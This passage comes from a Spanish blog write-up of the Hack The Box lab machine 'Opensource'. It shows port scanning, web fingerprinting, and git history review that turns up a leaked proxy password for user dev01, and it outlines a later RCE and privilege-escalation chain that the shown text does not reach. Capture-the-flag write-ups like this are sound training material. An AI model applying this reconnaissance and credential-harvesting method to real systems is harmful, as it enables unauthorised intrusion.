<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox Writeup Opensource" /><meta property="og:locale" content="en" /><meta name="description" content="Entorno Linux con una aplicación en un servidor web con Python que permitía en uno de sus archivos implementar una funcionalidad agregando una nueva ruta para explotar RCE (Remote code execution) al subir el archivo y conseguir entrar a un contenedor. Luego creamos un tunel con Chisel para entrar a un servicio que no teniamos conexión, y luego gracias a una Fuga de información (Information lekeage) anteriormente extraída de un arhivo zip que ofrecia la web logramos entrar al servicio, extraer una Private key y entrar a la máquina víctima como cierto usuario. Para la escalada listamos procesos Cron con pspy y explotamos la ejecución de git usando Git hooks y conseguimos ser root" /><meta property="og:description" content="Entorno Linux con una aplicación en un servidor web con Python que permitía en uno de sus archivos implementar una funcionalidad agregando una nueva ruta para explotar RCE (Remote code execution) al subir el archivo y conseguir entrar a un contenedor. Luego creamos un tunel con Chisel para entrar a un servicio que no teniamos conexión, y luego gracias a una Fuga de información (Information lekeage) anteriormente extraída de un arhivo zip que ofrecia la web logramos entrar al servicio, extraer una Private key y entrar a la máquina víctima como cierto usuario. Para la escalada listamos procesos Cron con pspy y explotamos la ejecución de git usando Git hooks y conseguimos ser root" /><link rel="canonical" href="https://e1p0tr0.github.io/posts/HTBOpensource/" /><meta property="og:url" content="https://e1p0tr0.github.io/posts/HTBOpensource/" /><meta property="og:site_name" content="Marss" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-06-28T00:07:13-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackthebox Writeup Opensource" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-06-28T00:07:13-05:00","datePublished":"2022-06-28T00:07:13-05:00","description":"Entorno Linux con una aplicación en un servidor web con Python que permitía en uno de sus archivos implementar una funcionalidad agregando una nueva ruta para explotar RCE (Remote code execution) al subir el archivo y conseguir entrar a un contenedor. Luego creamos un tunel con Chisel para entrar a un servicio que no teniamos conexión, y luego gracias a una Fuga de información (Information lekeage) anteriormente extraída de un arhivo zip que ofrecia la web logramos entrar al servicio, extraer una Private key y entrar a la máquina víctima como cierto usuario. Para la escalada listamos procesos Cron con pspy y explotamos la ejecución de git usando Git hooks y conseguimos ser root","headline":"Hackthebox Writeup Opensource","mainEntityOfPage":{"@type":"WebPage","@id":"https://e1p0tr0.github.io/posts/HTBOpensource/"},"url":"https://e1p0tr0.github.io/posts/HTBOpensource/"}</script><title>Hackthebox Writeup Opensource | Marss</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Marss"><meta name="application-name" content="Marss"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Marss</a></div><div class="site-subtitle font-italic">Freelance Professional [eJPTv2]</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/E1P0TR0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['marsello.guillen','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox Writeup Opensource</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Writeup Opensource</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Marsello Guillén</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1656392833" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-06-28 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3796 words"> <em>21 min</em> read</span></div></div></div><div class="post-content"><p>Entorno <strong>Linux</strong> con una aplicación en un servidor web con <strong>Python</strong> que permitía en uno de sus archivos implementar una funcionalidad agregando una nueva ruta para explotar <strong>RCE (Remote code execution)</strong> al subir el archivo y conseguir entrar a un contenedor. Luego creamos un tunel con <strong>Chisel</strong> para entrar a un servicio que no teniamos conexión, y luego gracias a una <strong>Fuga de información (Information lekeage)</strong> anteriormente extraída de un arhivo zip que ofrecia la web logramos entrar al servicio, extraer una <strong>Private key</strong> y entrar a la máquina víctima como cierto usuario. Para la escalada listamos procesos <strong>Cron</strong> con <strong>pspy</strong> y explotamos la ejecución de git usando <strong>Git hooks</strong> y conseguimos ser <strong>root</strong></p><hr /><p><img data-src="/assets/img/htb/writeups/opensource/logo.png" alt="OpensourceLogo" class="shadow" data-proofer-ignore></p><div class="table-wrapper"><table><thead><tr><th style="text-align: center">OS<th style="text-align: center">IP<th style="text-align: center">Release Date<th style="text-align: center">Difficulty<th style="text-align: center">Points<tbody><tr><td style="text-align: center">Linux<td style="text-align: center">10.10.11.164<td style="text-align: center">21 May 2022<td style="text-align: center">Easy<td style="text-align: center">20</table></div><hr /><p>Antes de empezar verificamos que estamos conectado a la <strong>VPN</strong> de HTB y tenemos conexión con la máquina:</p><div class="language-shell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">&gt;</span> ping <span class="nt">-c1</span> 10.10.11.164
PING 10.10.11.164 <span class="o">(</span>10.10.11.164<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.11.164: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>107 ms
                                          <span class="se">\_</span>_____________________ Linux Machine
<span class="nt">---</span> 10.10.11.164 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
          <span class="se">\_</span>________________<span class="se">\_</span>___________________________________ Successful connection
rtt min/avg/max/mdev <span class="o">=</span> 106.937/106.937/106.937/0.000 ms
</pre></table></code></div></div><blockquote><p>Explicación de parámetros:</p><p>-c &lt;count&gt; : Número de paquetes ICMP que deseamos enviar a la máquina</p></blockquote><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Con <code class="language-plaintext highlighter-rouge">nmap</code> realizamos un escaneo de tipo <strong>TCP (Transfer Control Protocol)</strong> para descubrir puertos abiertos:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="go">❯ nmap -p- -sS --min-rate 5000 -n -Pn 10.10.11.164
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-28 13:01 -05
Nmap scan report for 10.10.11.164
Host is up (0.11s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh      
                   \_________ Secure Shell Protocol
80/tcp   open     http     
                   \_________ HyperText Transfer Protocol
3000/tcp filtered ppp
		   \_________ Point-to-Point Protocol
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p- : Escanear todos los puertos, del 1 al 65,535</p><p>-sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo</p><p>--min-rate &lt;number&gt; : Enviar una taza (&lt;number&gt;) de paquetes por segundo como mínimo</p><p>-n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS)</p><p>-Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneo</p></blockquote><p>Ahora procedemos a escanear los puertos <strong>22(SSH) - 80(HTTP) - 3000(PPP)</strong> en específico:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
</pre><td class="rouge-code"><pre><span class="go">❯ nmap -p22,80,3000 -sC -sV 10.10.11.164 -oN targetTCP                                                                                                        
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-28 17:49 -05                                                                                               
Nmap scan report for 10.10.11.164                                                                                                                             
Host is up (0.11s latency).                                                                                                                                   
                                                                                                                                                              
PORT     STATE    SERVICE VERSION                                                                                                                             
</span><span class="gp">22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>                                                                        
<span class="go">| ssh-hostkey:                                                                                                                                                
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)                                                                                                
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)                                                                                               
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)                                                                                             
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3                                                                                                        
| fingerprint-strings:                                                                                                                                        
|   GetRequest:                                                                                                                                               
|     HTTP/1.1 200 OK                                                                                                                                         
|     Server: Werkzeug/2.1.2 Python/3.10.3                                                                                                                    
|     Date: Tue, 28 Jun 2022 22:50:08 GMT                                                                                                                     
</span><span class="gp">|     Content-Type: text/html;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8                                                                                                                  
<span class="go">|     Content-Length: 1360                                                                                                                                    
|     Connection: close                                                                                                                                       
</span><span class="gp">|     &lt;html lang="en"&gt;</span><span class="w">                                                                                                                                        
</span><span class="gp">|     &lt;head&gt;</span><span class="w">                                                                                                                                                  
</span><span class="gp">|     &lt;meta charset="UTF-8"&gt;</span><span class="w">                                                                                                                                  
</span><span class="gp">|     &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;</span><span class="w">                                                                                  
</span><span class="gp">|     &lt;title&gt;</span>upcloud - Upload files <span class="k">for </span>Free!&lt;/title&gt;                                                                                                         
<span class="gp">|     &lt;script src="/static/vendor/jquery/jquery-3.4.1.min.js"&gt;</span>&lt;/script&gt;                                                                                       
<span class="gp">|     &lt;script src="/static/vendor/popper/popper.min.js"&gt;</span>&lt;/script&gt;                                                                                             
<span class="gp">|     &lt;script src="/static/vendor/bootstrap/js/bootstrap.min.js"&gt;</span>&lt;/script&gt;                                                                                    
<span class="gp">|     &lt;script src="/static/js/ie10-viewport-bug-workaround.js"&gt;</span>&lt;/script&gt;                                                                                      
<span class="gp">|     &lt;link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/&gt;</span><span class="w">                                                                              
</span><span class="gp">|     &lt;link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/&gt;</span><span class="w">                                                                        
</span><span class="gp">|     &lt;link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/&gt;</span><span class="w">                                                                      
</span><span class="go">|     &lt;link rel="
|   HTTPOptions:                                                                                                                                              
|     HTTP/1.1 200 OK                                                                                                                                         
|     Server: Werkzeug/2.1.2 Python/3.10.3                                                                                                                    
|     Date: Tue, 28 Jun 2022 22:50:09 GMT                                                                                                                     
</span><span class="gp">|     Content-Type: text/html;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8                                                                                                                  
<span class="go">|     Allow: HEAD, POST, OPTIONS, GET                                                                                                                         
|     Content-Length: 0                                                                                                                                       
|     Connection: close
|   RTSPRequest: 
|     &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
</span><span class="gp">|     "http://www.w3.org/TR/html4/strict.dtd"&gt;</span><span class="w">
</span><span class="gp">|     &lt;html&gt;</span><span class="w">
</span><span class="gp">|     &lt;head&gt;</span><span class="w">
</span><span class="gp">|     &lt;meta http-equiv="Content-Type" content="text/html;</span><span class="nv">charset</span><span class="o">=</span>utf-8<span class="s2">"&gt;
</span><span class="gp">|     &lt;title&gt;</span><span class="s2">Error response&lt;/title&gt;
</span><span class="gp">|     &lt;/head&gt;</span><span class="w">
</span><span class="gp">|     &lt;body&gt;</span><span class="w">
</span><span class="gp">|     &lt;h1&gt;</span><span class="s2">Error response&lt;/h1&gt;
</span><span class="gp">|     &lt;p&gt;</span><span class="s2">Error code: 400&lt;/p&gt;
</span><span class="gp">|     &lt;p&gt;</span><span class="s2">Message: Bad request version ('RTSP/1.0').&lt;/p&gt;
</span><span class="gp">|     &lt;p&gt;</span><span class="s2">Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
</span><span class="gp">|     &lt;/body&gt;</span><span class="w">
</span><span class="gp">|_    &lt;/html&gt;</span><span class="w">
</span><span class="go">|_http-title: upcloud - Upload files for Free!
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
3000/tcp filtered ppp
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p &lt;port_1,port_2,...&gt; : Indicamos que puertos queremos escanear</p><p>-sC : Ejecutar en los puertos scripts por defecto de nmap</p><p>-sV : Activar detección de versiones de los servicios que corren por los puertos</p><p>-oN &lt;file&gt; : Guardar el output del escaneo en un archivo con formato Nmap</p></blockquote><p>Ya que no disponemos de credenciales para entrar por <strong>SSH</strong>, empezamos con el servicio web que corre por el puerto <strong>80 (HTTP)</strong>:</p><blockquote><p>Para empezar de manera rápida usamos <code class="language-plaintext highlighter-rouge">whatweb</code> para ver tecnologías del sitio</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">❯ whatweb 10.10.11.164
http://10.10.11.164 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.1.2 Python/3.10.3], IP[10.10.11.164], JQuery[3.4.1], Python[3.10.3], Script, Title[upcloud - Upload files for Free!], Werkzeug[2.1.2]
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Si quieres una opción gráfica puedes usar en tu navegador la extensión <a href="https://www.wappalyzer.com/apps/">Wappalyzer</a> y ver las tecnologías</p></div></blockquote><p>De primeras observamos que en el servicio web corre <code class="language-plaintext highlighter-rouge">Werkzeug</code>, pero qué es?</p><p><img data-src="/assets/img/htb/writeups/opensource/werkzeug_concept.png" alt="Werkzeug" class="shadow" data-proofer-ignore></p><p>Encontes, el sustantivo en alemán <strong>Werkzeug = herramienta</strong> es una biblioteca de aplicaciones web <strong>WSGI</strong>, pero este último qué es?</p><p><img data-src="/assets/img/htb/writeups/opensource/wsgi_concept.png" alt="WSGI" class="shadow" data-proofer-ignore></p><p>Entonces, <code class="language-plaintext highlighter-rouge">WSGI (Web Server Gateway Interface)</code> es una especificación de interfaz (protocolo ó convención) que permite la comunicación entre un servidor web y una aplicación web, basado en una serie de reglas para cualquier inconveniente de comunicación.</p><blockquote class="prompt-tip"><div><p>Documentación de <code class="language-plaintext highlighter-rouge">Werkzeug</code> para mayor información: <a href="https://werkzeug.palletsprojects.com/en/2.1.x/">https://werkzeug.palletsprojects.com/en/2.1.x/</a></p></div></blockquote><blockquote><p>Con <code class="language-plaintext highlighter-rouge">Firefox</code> podemos ver el sitio web</p></blockquote><p><img data-src="/assets/img/htb/writeups/opensource/http_web.png" alt="HttpWeb" class="shadow" data-proofer-ignore></p><p>Existen algunos problemas al mostrar la página principal, pero en resumen esta web nos habla de una aplicación llamada <code class="language-plaintext highlighter-rouge">Upcloud</code> que nos permite subir archivos de manera online (como observamos en la imagen anterior), y también nos permite descargar su contenido para usarla de manera local, lo cuál es bastante peligroso…</p><p>Primero testeamos un poco el funcionamiento de este servicio:</p><blockquote><p>Subiendo un archivo</p></blockquote><p><img data-src="/assets/img/htb/writeups/opensource/web_testing_0.png" alt="Testing" class="shadow" data-proofer-ignore></p><p>Solo observamos la ruta en la que se almacenaran los archivos subidos</p><blockquote><p>Subiendo ningún archivo</p></blockquote><p><img data-src="/assets/img/htb/writeups/opensource/web_testing_1.png" alt="Testing" class="shadow" data-proofer-ignore></p><p>Ya que sabemos que se está usando <code class="language-plaintext highlighter-rouge">Python</code>, basado en las rutas del error, tiene sentido que se use el microframework <code class="language-plaintext highlighter-rouge">Flask</code> que permite crear aplicaciones web de todo tipo.</p><p>Además de muchas funciones de error, podemos ver la ruta de la aplicación <strong>/app/public/uploads/</strong> que como vimos antes podría almacenar los archivos subidos</p><p>Para quitarnos las dudas procedemos a examinar el archivo comprimido de la aplicación que nos proporcinaba la web:</p><p>Usamos <code class="language-plaintext highlighter-rouge">unzip</code> para extraer todos los archivos:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="go">❯ unzip -q source.zip
	 \_________________ quite mode
❯ ls -a
       \______ show hidden files
 .   ..   .git   app   config   build-docker.sh   Dockerfile   source.zip
            |     |_______|           |                |            \________ compressed file
	    |         |               |                |
	    |	      |	              |                |___ simple text file that contains a list of commands that the Docker client calls while creating an image
	    |         |               | 
	    |         |               |___ script that build an image from a Dockerfile
	    |         |
	    |         |___ Upcloud app files
	    |        
	    |___ folder that contains all the information that is necessary for your project in version control
</span></pre></table></code></div></div><p>Observamos que hay un script para montarnos de manera local la aplicación en un contenedor usando <code class="language-plaintext highlighter-rouge">Docker</code>, pero qué es?</p><p><img data-src="/assets/img/htb/writeups/opensource/docker_concept.png" alt="Docker" class="shadow" data-proofer-ignore></p><p>En resumen, <a href="https://www.ibm.com/cloud/learn/docker">Docker</a> que significa <strong>Estibador (persona encargada de cargar y descargar mercancias de embarcaciones)</strong>, es una herramienta que permite empaquetar una aplicación y sus dependencias en un contenedor muy ligero. Existe un confusión respecto a las máquinas virtuales, pero dejemos en claro una diferencia:</p><blockquote><p>Container</p><p>Son una abstracción de la capa de aplicación que empaqueta el código y sus dependencias</p><hr /><p>Virtual Machine (VM)</p><p>Son una abstracción del hardware físico que converte un servidor en muchos servidores</p></blockquote><blockquote class="prompt-tip"><div><p>En general los contenedores <strong>ocupan menos espacio y arrancan más rapido</strong> ya que virtualizan la parte del hardware</p></div></blockquote><p>Aparte de eso, encontramos el directorio <code class="language-plaintext highlighter-rouge">.git</code>, el cuál significa que existen diferentes versiones del proyecto las cuales podemos ver y examinar</p><p>Entramos al directorio y buscamos los <code class="language-plaintext highlighter-rouge">logs</code> con el comando <code class="language-plaintext highlighter-rouge">git log</code> para ver los diferentes cambios <strong>“commits”</strong> que se han hecho, pero no encontramos nada</p><p>Entonces examinamos las ramas o <strong>branches (ramas del estado del código que crean un nuevo camino para la evolución del mismo)</strong> que existen:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="go">❯ git branch
  dev
* public
❯ git log dev -p
*********************
***************
**********
diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json             
deleted file mode 100644               
index 5975e3f..0000000                                                         
--- a/app/.vscode/settings.json
+++ /dev/null                         
@@ -1,5 +0,0 @@                        
-{                 
-  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",                                                                             
</span><span class="gp">-  "http.proxy": "http://dev01:Soulless_Developer#</span>2022@10.10.10.128:5187/<span class="s2">", 
</span><span class="go">			       \______________ posible credentials !
-  "http.proxyStrictSSL": false
-}                    
                                       
commit a76f8f75f7a4a12b706b0cf9c983796fa1985820                                
</span><span class="gp">Author: gituser &lt;gituser@local&gt;</span><span class="w">
</span><span class="go">Date:   Thu Apr 28 13:46:16 2022 +0200
**************************
***************************
*******************
</span></pre></table></code></div></div><p>Con el comando <code class="language-plaintext highlighter-rouge">git branch</code> logramos encontrar dos ramas, y al ver las diferencias de cada commit con el comando <code class="language-plaintext highlighter-rouge">git log &lt;branch_name&gt; -p</code> encontramos unas credenciales de un posible usuario <code class="language-plaintext highlighter-rouge">dev01</code></p><p>Ahora intentamos examinar los archivos de la aplicación para entender su funcionamiento, y aquí una pista del nombre la máquina <strong>Opensource</strong></p><blockquote><p>Opensource</p><p>Es un codigo diseñado para el acceso publico. De manera colaborativa distintas comunidades pueden ver y modifcar el codigo para su mejora continua</p></blockquote><p>Examinamos el directorio <code class="language-plaintext highlighter-rouge">config</code> y encontramos el archivo <code class="language-plaintext highlighter-rouge">supervisord.conf</code></p><blockquote><p>Supervidord</p><p>Sistema cliente/servidor que permite controlar los procesos/servicios dentro de un sistema UNIX</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="go">[supervisord]
user=root
nodaemon=true
logfile=/dev/null
logfile_maxbytes=0
pidfile=/run/supervisord.pid

[program:flask]
command=python /app/run.py
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0
</span></pre></table></code></div></div><p>Podemos observar que el usuario <code class="language-plaintext highlighter-rouge">root</code> ejecutara el comando <code class="language-plaintext highlighter-rouge">python /app/run.py</code>, el cuál posiblemente inicia el funcionamiento de la aplicación</p><p>Ahora examinamos el directorio <code class="language-plaintext highlighter-rouge">app</code> y efectivamente, ese archivo inicia todo el proceso pero además importa mas archivos en otro directorio también llamado <code class="language-plaintext highlighter-rouge">app</code></p><p>Después de analizar cada archivo logramos entender como es el funcionamiento y la posible brecha que podemos explotar</p><p>Con el conocimiento del microframework <code class="language-plaintext highlighter-rouge">Flask</code> podemos usar a nuestro favor el siguiente archivo <code class="language-plaintext highlighter-rouge">views.py</code>:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
